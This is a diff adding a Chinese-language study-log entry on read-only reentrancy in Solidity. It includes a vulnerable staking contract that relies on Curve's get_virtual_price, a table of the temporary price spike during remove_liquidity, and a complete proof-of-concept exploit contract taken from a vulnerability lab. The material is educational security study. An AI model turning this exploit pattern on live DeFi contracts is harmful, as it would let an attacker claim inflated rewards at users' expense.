@@ -15,6 +15,131 @@ timezone: UTC+8
 ## Notes
 
 <!-- Content_START -->
+# 2025-08-12
+
+这一周刚好从今天开始连续5天都有事没啥空，希望能尽量挤出点时间来水下签到，别似了（笑）
+
+想到自己之前的博客还有坑没填完，这里填一下，之后找个时间从这里填回去，今天就只写一个只读重入（Read-only Reentrancy）攻击吧（其它的重入攻击或多或少写过一点，除了Double Entrypoint）
+
+> 漏洞合约和攻击合约源码来自[DeFiVulnLabs/src/test/ReadOnlyReentrancy.sol at main · SunWeb3Sec/DeFiVulnLabs](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/ReadOnlyReentrancy.sol)
+
+本质上重入攻击的攻击点就是在于合约状态变量和现实情况之间的差别，通常是合约状态变量没能赶上现实情况的变化，从而导致攻击者能够利用虚假的变量值进行一些操作
+
+只读重入也是类似的，差别是漏洞合约过分信任被`view`修饰的函数，比如主网上的案例：[Lido: Curve Liquidity Farming Pool Contract | Address: 0xDC24316b...Ea0f67022 | Etherscan](https://etherscan.io/address/0xDC24316b9AE028F1497c275EB9192a3Ea0f67022#code)
+
+假定我们有一个依赖于上面的合约的`get_virtual_price`函数提供奖励的质押合约：
+
+```solidity
+// VulnContract
+// users stake LP_TOKEN
+// getReward rewards the users based on the current price of the pool LP token
+contract VulnContract {
+    IERC20 public constant token = IERC20(LP_TOKEN);
+    ICurve private constant pool = ICurve(STETH_POOL);
+
+    mapping(address => uint) public balanceOf;
+
+    function stake(uint amount) external {
+        token.transferFrom(msg.sender, address(this), amount);
+        balanceOf[msg.sender] += amount;
+    }
+
+    function unstake(uint amount) external {
+        balanceOf[msg.sender] -= amount;
+        token.transfer(msg.sender, amount);
+    }
+
+    function getReward() external view returns (uint) {
+        //rewarding tokens based on the current virtual price of the pool LP token
+        uint reward = (balanceOf[msg.sender] * pool.get_virtual_price()) /
+            1 ether;
+        // Omitting code to transfer reward tokens
+        return reward;
+    }
+}
+```
+
+那么我们可以通过往Pool先`add_liquidity`然后`remove_liquidity`，此时根据Pool源码，我们发现Pool会首先burn掉代币然后进行转账，那么此时由于`total_supply`降低，此时会导致`get_virtual_price`临时升高，最终导致我们的`getReward`返回更多的奖励
+
+中途虚拟价格发生的变化就是这样的表格：
+
+| 阶段   | LP代币总量 | 基础代币余额 | D值              | 虚拟价格                  |
+| ------ | ---------- | ------------ | ---------------- | ------------------------- |
+| 初始   | X          | Y            | D0               | P0 = D0/X                 |
+| 销毁后 | X' = X-ΔX  | Y            | D0               | P1 = D0/(X-ΔX) (临时升高) |
+| 转账后 | X-ΔX       | Y-ΔY         | D1 ≈ D0*(X-ΔX)/X | P2 ≈ D0/X (恢复)          |
+
+最终的攻击合约如下：
+
+```solidity
+contract ExploitContract {
+    ICurve private constant pool = ICurve(STETH_POOL);
+    IERC20 public constant lpToken = IERC20(LP_TOKEN);
+    VulnContract private immutable target;
+
+    constructor(address _target) {
+        target = VulnContract(_target);
+    }
+
+    // Stake LP into VulnContract
+    function stakeTokens() external payable {
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        console.log(
+            "LP token price after staking into VulnContract",
+            pool.get_virtual_price()
+        );
+
+        lpToken.approve(address(target), lp);
+        target.stake(lp);
+    }
+
+    // Perform Read-Only Reentrancy
+    function performReadOnlyReentrnacy() external payable {
+        // Add liquidity to Curve
+        uint[2] memory amounts = [msg.value, 0];
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
+        // Log get_virtual_price
+        console.log(
+            "LP token price before remove_liquidity()",
+            pool.get_virtual_price()
+        );
+        // Remove liquidity from Curve
+        // remove_liquidity() invokes the recieve() callback
+        uint[2] memory min_amounts = [uint(0), uint(0)];
+        pool.remove_liquidity(lp, min_amounts);
+        // Log get_virtual_price
+        console.log(
+            "--------------------------------------------------------------------"
+        );
+        console.log(
+            "LP token price after remove_liquidity()",
+            pool.get_virtual_price()
+        );
+
+        // Attack - Log reward amount
+        uint reward = target.getReward();
+        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
+    }
+
+    receive() external payable {
+        // receive() is called when the remove_liquidity is called
+        console.log(
+            "--------------------------------------------------------------------"
+        );
+        console.log(
+            "LP token price during remove_liquidity()",
+            pool.get_virtual_price()
+        );
+        // Attack - Log reward amount
+        uint reward = target.getReward();
+        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
+    }
+}
+```
+
+还是那句话：Don't trust anyone
+
 # 2025-08-11
 
 昨天写了AA的其中一类方案：升级智能合约钱包，使其能够主动发送交易，那今天就写一下另一类方案吧，就选比较有代表性的EIP-7702吧
